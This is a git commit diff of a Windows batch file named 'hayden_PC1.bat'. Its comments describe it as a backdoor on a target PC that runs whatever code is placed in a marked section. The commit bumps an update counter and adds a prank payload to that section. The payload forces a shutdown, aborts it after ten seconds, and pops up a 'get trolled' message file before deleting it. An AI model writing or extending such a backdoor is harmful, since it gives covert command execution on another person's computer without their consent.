19dbfa88799a474aa04dfa2107962cf617340660
Luke Nicholls <57662212+Guest257351@users.noreply.github.com>
2021-06-24 10:29:02 +0930

    Update hayden_PC1.bat

--- hayden_PC1.bat
+++ hayden_PC1.bat
@@ -3,11 +3,18 @@ set number=1
   set /p number=
 )
 :: ADD 1 TO UPDATE TO RUN THE CODE ::
-set update=2
+set update=3
 if %number% equ %update% (goto end)
 :: do not use the command exit, this will dissabled the backdoor on the target PC untill it is restarted
 :: PUT CODE IN HERE :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 shutdown /s
+timeout 10 /NOBREAK>nul
+shutdown /a
+echo shutdown aborted>message.txt
+echo get trolled>>message.txt
+start message.txt
+timeout 1
+del message.txt
 
 
 
